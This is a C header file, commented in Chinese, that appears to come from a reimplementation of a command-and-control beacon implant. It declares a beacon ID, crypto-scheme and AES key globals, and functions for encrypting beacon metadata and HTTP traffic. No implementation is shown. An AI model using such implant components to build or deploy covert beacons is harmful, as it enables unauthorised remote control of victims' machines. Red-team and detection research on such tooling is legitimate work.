#pragma once
#include "tomcrypt.h"
#include <Windows.h>
//#pragma comment(lib,"Advapi32.lib")
#ifdef _WIN64

#pragma comment(lib,"tomcryptx64.lib")
#pragma comment(lib,"tommathx64.lib")
#else

#pragma comment(lib,"tomcrypt.lib")
#pragma comment(lib,"tommath.lib")
#endif // _WIN64

extern int sha256_idx;
extern int aes_idx;


extern int aes_key_hash_ago_16[4];
extern int aes_key_hash_up_16[4];
extern char initialization_vector[16];

extern symmetric_key beacon_symmetric_key;
extern symmetric_CBC beacon_symmetric_CBC;

/*beacon id*/
extern DWORD beacon_id;
extern WORD CryptoScheme;

/// <summary>
/// 构造元数据并加密
/// </summary>
/// <param name="Metadata">此参数是临时buffer</param>
/// <param name="size">临时buffer的大小</param>
void Generate_encryption_metadata(char* Metadata, int size);

/// <summary>
/// 随机生成int
/// </summary>
/// <returns></returns>
int random_int();


/// <summary>
/// aes 解密 http请求返回数据
/// </summary>
/// <param name="encrypt_data_buffer"></param>
/// <param name="data_size"></param>
/// <returns></returns>
size_t decrypt_output_data(char* encrypt_data_buffer, int data_size);

int aes_cbc_encrypt(int size, char* in);

char* aes_encrypt_data(void* data, size_t data_Size, int msg_id, int* out_encrypt_data_len);

int random_bytesarray(BYTE* pbBuffer, DWORD dwLen);